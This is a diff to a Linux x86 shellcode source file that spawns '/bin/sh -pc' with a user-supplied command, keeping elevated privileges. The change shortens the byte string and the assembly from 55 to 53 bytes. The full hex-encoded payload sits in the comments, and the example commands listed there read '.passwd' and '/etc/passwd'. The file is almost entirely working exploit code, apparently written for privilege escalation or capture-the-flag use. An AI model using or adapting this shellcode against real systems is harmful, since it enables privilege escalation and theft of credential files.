@@ -3,7 +3,7 @@
 	#	(by Daniel Henry-Mantilla)			#
 
 # char shellcode[] =
-#  "\x31\xc0\xb0\x63\x50\x66\x68\x2d\x70\x89\xe3\xb0\x0b\x99\x52\xeb\x20\x8b\x34\x24\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x8d\x5c\x24\xf0\x53\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xcd\x80\xe8\xdb\xff\xff\xff"\
+#  "\x6a\x63\x66\x68\x2d\x70\x89\xe3\x6a\x0b\x58\x99\x52\xeb\x20\x8b\x34\x24\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x8d\x5c\x24\xf0\x53\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xcd\x80\xe8\xdb\xff\xff\xff"\
 #  "custom_cmd"\
 #  "#"; // Terminator (required /!\)
 
@@ -13,24 +13,22 @@
 # 3: "cat .passwd"\
 # 4: "cat /etc/passwd && /etc/shallow"\
 
-# Total length of the shellcode = 55 + custom_cmd_length
-# Since 55 = 54 (prefix_length) + 1 (terminating char)
+# Total length of the shellcode = 53 + custom_cmd_length
+# Since 53 = 52 (prefix_length) + 1 (terminating char)
 
 	.set END, 0x23		# terminating char (e.g, '#')
 .text
 .globl _start
 _start:
-	xorl %eax, %eax
-
-	mov $0x63, %al		# "c"
-	push %eax
+	push $0x63		# "c"
 	pushw $0x702d		# '-p'
 	movl %esp, %ebx		# address of "-pc"
 
-	movb $0xb, %al		# sys_execve
+	push $11		# sys_execve
+	pop %eax
 
 	cdq			# env = %edx = NULL
-	pushl %edx		# NULL terminator of argv[]
+	pushl %edx		# argv[3] = NULL
 
 	jmp cmd
 	back:
